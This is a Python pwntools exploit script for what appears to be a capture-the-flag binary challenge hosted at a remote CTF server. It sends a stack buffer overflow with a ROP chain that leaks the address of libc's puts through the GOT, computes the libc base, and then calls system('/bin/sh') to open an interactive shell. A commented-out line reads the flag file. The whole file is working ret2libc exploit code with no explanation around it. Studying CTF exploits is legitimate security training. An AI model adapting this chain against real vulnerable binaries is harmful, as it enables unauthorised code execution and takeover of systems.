from pwn import *
from os import system

context.log_level = 'error'

exe = ELF("../file/chall")
libc = ELF("../file/libc-2.27.so")
ld = ELF("../file/ld-2.27.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("challs.htsp.ro", 8001)

    return r


def main():    
    r = process([exe.path])

    #payload = cyclic(0x420)
    #r.sendline(payload)
    #r.sendline(b'done')
    #r.wait()

    #core = Coredump('./core')
    #offset = cyclic_find(core.fault_addr)
    r.close()
    
    offset = 1038

    rop = ROP([exe, libc, ld])
    rop.raw('A' * offset)
    rop.call(exe.plt['puts'], [exe.got["puts"]])
    rop.call(rop.find_gadget(['ret']))
    rop.call(exe.symbols["main"])
    print(rop.chain())

    r = conn()
    r.recvuntil(b'/dev/null\n')
    input('continue?')
    r.sendline(rop.chain())
    r.sendline(b'done')

    leaked_puts = r.recvuntil(b'\n').strip()[-6:].ljust(8, b'\x00')
    leaked_puts = u64(leaked_puts)

    libc.address = leaked_puts - libc.symbols['puts']

    rop = ROP([exe, libc, ld])
    rop.raw('A' * offset)
    rop.call(libc.symbols['system'], [next(libc.search(b"/bin/sh\x00"))])

    r.recvuntil(b'/dev/null\n')
    r.sendline(rop.chain())
    r.sendline(b'done')
    r.interactive()
    #r.sendline(b'cat /home/ctf/flag.txt')
    #flag = r.recvlineS()
    #r.close()

    #print(flag)

if __name__ == "__main__":
    main()
